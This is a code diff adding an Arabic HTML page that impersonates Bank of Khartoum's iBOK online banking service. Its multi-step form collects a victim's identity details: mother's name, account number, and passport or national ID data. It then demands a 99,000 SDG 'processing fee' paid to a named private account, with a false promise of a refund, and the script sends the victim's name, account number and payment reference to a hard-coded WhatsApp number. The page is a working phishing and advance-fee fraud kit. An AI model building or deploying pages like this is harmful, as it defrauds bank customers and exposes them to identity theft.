@@ -1,0 +1,232 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>بنك الخرطوم - خدمات المعالجة اليدوية</title>
+    
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap" rel="stylesheet">
+    
+    <style>
+        :root { --bok-red: #C1272D; --bok-gold: #c6a357; --bok-text: #231F20; --bok-input-border: #D1D3D4; }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: 'Cairo', sans-serif; background-color: #FFFFFF; color: var(--bok-text); overflow-x: hidden; width: 100%; }
+        
+        /* الواجهة الرئيسية */
+        .landing-container { position: relative; width: 100%; display: flex; flex-direction: column; cursor: pointer; }
+        .main-img { width: 100%; height: auto; display: block; border: none; }
+        .smart-overlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0); z-index: 50; }
+        .bok-btn-gold { background-color: var(--bok-gold); color: white; padding: 22px 10px; font-weight: bold; width: 100%; display: block; font-size: 17px; border: none; cursor: pointer; }
+
+        /* الهيدر */
+        .page-header { 
+            background-color: var(--bok-red); color: #FFFFFF; padding: 15px 20px; width: 100%; 
+            display: flex; align-items: center; justify-content: space-between; 
+            position: fixed; top: 0; left: 0; z-index: 1000;
+        }
+
+        .main-content { margin-top: 80px; padding: 20px; width: 100%; max-width: 550px; margin-left: auto; margin-right: auto; min-height: 70vh; }
+        
+        .bok-input { width: 100%; padding: 14px 15px; border: 1px solid var(--bok-input-border); border-radius: 8px; font-size: 14px; outline: none; text-align: right; margin-bottom: 15px; display: block; }
+        .bok-input:focus { border-color: var(--bok-red); }
+        .bok-btn-primary { background-color: var(--bok-red); color: #FFFFFF; font-weight: 700; padding: 14px 20px; border-radius: 8px; width: 100%; cursor: pointer; border: none; font-size: 16px; }
+        
+        .step-container { display: none; }
+        .step-container.active { display: block; }
+        .service-card { border: 2px solid #f3f4f6; transition: all 0.3s; cursor: pointer; border-radius: 12px; border-right: 6px solid var(--bok-red); margin-bottom: 15px; }
+        .hidden-section { display: none; }
+
+        .footer-credits { text-align: center; padding: 25px 10px; background-color: #fff; width: 100%; }
+        .footer-credits p { font-size: 13px; color: #666; margin-bottom: 4px; }
+        .footer-credits .design-firm { font-size: 16px; color: #000; font-weight: 800; letter-spacing: 0.5px; text-transform: uppercase; }
+    </style>
+</head>
+<body>
+
+    <div id="landing-page">
+        <div class="landing-container" onclick="openApp()">
+            <img src="Main_bg.jpg" alt="بنك الخرطوم" class="main-img">
+            <div class="smart-overlay"></div>
+            <button class="bok-btn-gold">المتابعة الي قسم المعالجة اليدوية ←</button>
+        </div>
+        <footer class="footer-credits">
+            <p>© 2026 بنك الخرطوم السودان</p>
+            <div class="design-firm">DESIGNED & DEVELOPED BY THE DESIGN FIRM</div>
+        </footer>
+    </div>
+
+    <div id="main-app" class="hidden-section">
+        <header class="page-header">
+            <div class="flex items-center gap-3" onclick="goBack()" style="cursor: pointer;">
+                <i class="fas fa-arrow-right text-xl"></i>
+                <h1 class="font-bold text-lg" id="header-title">فتح حساب iBOK</h1>
+            </div>
+            <i class="fas fa-ellipsis-v text-lg"></i>
+        </header>
+
+        <main class="main-content" id="app-body">
+            <div id="stepper" class="flex items-center justify-center mb-10 gap-2">
+                <div id="p4" class="w-10 h-10 rounded-full bg-gray-200 text-gray-500 flex items-center justify-center font-bold">4</div>
+                <div class="flex-1 h-1 bg-gray-200" id="l3"></div>
+                <div id="p3" class="w-10 h-10 rounded-full bg-gray-200 text-gray-500 flex items-center justify-center font-bold">3</div>
+                <div class="flex-1 h-1 bg-gray-200" id="l2"></div>
+                <div id="p2" class="w-10 h-10 rounded-full bg-gray-200 text-gray-500 flex items-center justify-center font-bold">2</div>
+                <div class="flex-1 h-1 bg-gray-200" id="l1"></div>
+                <div id="p1" class="w-10 h-10 rounded-full bg-bok-red text-white flex items-center justify-center font-bold shadow-md">1</div>
+            </div>
+
+            <form id="mainForm" onsubmit="return false;">
+                
+                <div class="step-container active" id="step0">
+                    <h2 class="text-center font-bold text-xl mb-8">اختر نوع الخدمة:</h2>
+                    <div class="space-y-4">
+                        <div onclick="goToStep(1)" class="service-card p-5 flex items-center gap-4">
+                            <div class="bg-red-100 p-3 rounded-full text-bok-red"><i class="fas fa-globe text-xl"></i></div>
+                            <div>
+                                <div class="font-bold">فتح حساب الإنترنت المصرفي ibok</div>
+                                <div class="text-[11px] text-gray-500 mt-1">تنشيط خدمات الأونلاين ورفع سقف التحويل اليومي.</div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="step-container" id="step1">
+                    <input type="text" id="full_name" placeholder="الإسم كما في الجواز" class="bok-input">
+                    <input type="text" id="mother_name" placeholder="إسم الوالدة" class="bok-input">
+                    <input type="text" id="address" placeholder="بيانات السكن" class="bok-input">
+                    <input type="text" id="dob" placeholder="تاريخ الميلاد" class="bok-input">
+                    <input type="text" id="acc_number" placeholder="رقم الحساب" class="bok-input">
+                    <input type="text" id="job" placeholder="المهنة" class="bok-input">
+                    <button type="button" onclick="goToStep(2)" class="bok-btn-primary mt-6 shadow-lg">التالي</button>
+                </div>
+
+                <div class="step-container" id="step2">
+                    <input type="email" id="email" placeholder="البريد الإلكتروني" class="bok-input text-left" dir="ltr">
+                    <input type="tel" id="whatsapp" placeholder="رقم واتساب" class="bok-input text-left" dir="ltr">
+                    <input type="tel" id="phone_call" placeholder="رقم اتصال" class="bok-input text-left" dir="ltr">
+                    <div class="flex gap-3 mt-6">
+                        <button type="button" onclick="goToStep(1)" class="w-1/3 py-3 border border-gray-300 rounded-lg text-gray-600 font-bold">السابق</button>
+                        <button type="button" onclick="goToStep(3)" class="w-2/3 bok-btn-primary shadow-lg">التالي</button>
+                    </div>
+                </div>
+
+                <div class="step-container" id="step3">
+                    <input type="text" id="doc_id" placeholder="رقم الجواز او البطاقة القومية" class="bok-input">
+                    <input type="text" id="issue_date" placeholder="تاريخ الإصدار" class="bok-input">
+                    <input type="text" id="expiry_date" placeholder="تاريخ الانتهاء" class="bok-input">
+                    <input type="text" id="issue_place" placeholder="مكان الاصدار" class="bok-input">
+                    <div class="flex gap-3 mt-6">
+                        <button type="button" onclick="goToStep(2)" class="w-1/3 py-3 border border-gray-300 rounded-lg text-gray-600 font-bold">السابق</button>
+                        <button type="button" onclick="goToStep(4)" class="w-2/3 bok-btn-primary shadow-lg">التالي</button>
+                    </div>
+                </div>
+
+                <div class="step-container" id="step4">
+                    <div class="bg-red-50 p-6 border-r-4 border-red-600 mb-6 text-right leading-relaxed">
+                        <h3 class="text-lg font-bold text-red-800 mb-3">تنبيه المراجعة والتدقيق:</h3>
+                        
+                        <p class="text-sm text-gray-700 mb-4">
+                            لقد تم استلام بياناتك الأولية بنجاح. نظرًا لزيادة حجم الطلبات ولضمان سرعة التنفيذ، يتم الآن تفعيل خيار <b>المعالجة اليدوية الفورية</b>.
+                        </p>
+
+                        <div class="bg-white p-4 rounded-lg border border-red-100 mb-4 shadow-sm">
+                            <p class="text-[13px] text-gray-800 leading-6">
+                                يتم دفع رسوم رمزية بقيمة <b class="text-red-600">99,000 ج.س</b> مقابل معالجة طلبك يدوياً لضمان رفع السقف إلى <b>45 مليون ج.س</b>. سيتم خصم 5,000 ج.س فقط كرسوم إجرائية، وإعادة المتبقي (94,000 ج.س) إلى حسابكم فور اكتمال التنشيط.
+                            </p>
+                        </div>
+
+                        <div class="bg-gray-100 p-5 rounded-lg border border-dashed border-gray-400 text-center mb-4">
+                            <p class="text-xs text-gray-500 mb-2">حساب تحويل رسوم المعالجة (بنكك):</p>
+                            <p class="text-3xl font-bold text-red-700 tracking-widest mb-2">2938747</p>
+                            <p class="text-xs font-bold text-gray-700">باسم: إلهام الطيب احمد إبراهيم</p>
+                        </div>
+
+                        <input type="text" id="transaction_id" placeholder="أدخل رقم العملية من الإشعار" class="bok-input text-center font-bold text-lg border-2 border-red-200">
+
+                        <p class="text-xs text-gray-600 italic mt-2">
+                            * ملاحظة: لا يتم إرسال صور المستندات عبر الموقع، سيتم التحقق منها عبر الواتساب فور إرسال الطلب.
+                        </p>
+                    </div>
+
+                    <button type="button" onclick="sendToWhatsApp()" class="w-full bg-green-600 text-white font-bold py-4 rounded-lg flex items-center justify-center gap-3 shadow-xl">
+                        <i class="fab fa-whatsapp text-2xl"></i> تأكيد العملية والمواصلة عبر واتساب
+                    </button>
+                </div>
+            </form>
+
+            <footer class="footer-credits">
+                <p>© 2026 بنك الخرطوم السودان</p>
+                <div class="design-firm">DESIGNED & DEVELOPED BY THE DESIGN FIRM</div>
+            </footer>
+        </main>
+    </div>
+
+    <script>
+        const MY_WHATSAPP = "249960724630"; 
+        let currentStep = 0;
+
+        function openApp() {
+            document.getElementById('landing-page').style.display = 'none';
+            document.getElementById('main-app').classList.remove('hidden-section');
+            currentStep = 0;
+            window.scrollTo(0, 0);
+        }
+
+        function goBack() {
+            if (currentStep === 0) {
+                document.getElementById('main-app').classList.add('hidden-section');
+                document.getElementById('landing-page').style.display = 'block';
+            } else {
+                currentStep--;
+                showStep(currentStep);
+            }
+        }
+
+        function goToStep(step) {
+            currentStep = step;
+            showStep(step);
+        }
+
+        function showStep(step) {
+            document.querySelectorAll('.step-container').forEach(s => s.classList.remove('active'));
+            document.getElementById('step' + step).classList.add('active');
+            
+            // تحديث الستيبر
+            for(let i=1; i<=4; i++) {
+                let p = document.getElementById('p'+i);
+                let l = document.getElementById('l'+(i-1));
+                if(i <= step) {
+                    p?.classList.add('bg-bok-red', 'text-white');
+                    if(l) l.classList.add('bg-bok-red');
+                } else {
+                    p?.classList.remove('bg-bok-red', 'text-white');
+                    if(l) l.classList.remove('bg-bok-red');
+                }
+            }
+            window.scrollTo(0, 0);
+        }
+
+        function sendToWhatsApp() {
+            const name = document.getElementById('full_name').value;
+            const acc = document.getElementById('acc_number').value;
+            const transId = document.getElementById('transaction_id').value;
+            
+            if (currentStep === 4 && !transId) {
+                alert("يرجى إدخال رقم العملية لإكمال الطلب");
+                return;
+            }
+
+            const message = `*طلب فتح حساب iBOK (معالجة فورية)*%0A--------------------------%0A*الاسم:* ${name}%0A*رقم الحساب:* ${acc}%0A*رقم العملية:* ${transId}%0A--------------------------%0Aأرجو تأكيد الطلب ورفع السقف إلى 45 مليون جنيه سوداني.`;
+
+            window.open(`https://wa.me/${MY_WHATSAPP}?text=${message}`, '_blank');
+            
+            setTimeout(() => { 
+                alert("تم استلام طلبك بنجاح، سيتم التواصل معك عبر واتساب.");
+                location.reload(); 
+            }, 1000);
+        }
+    </script>
+</body>
+</html>
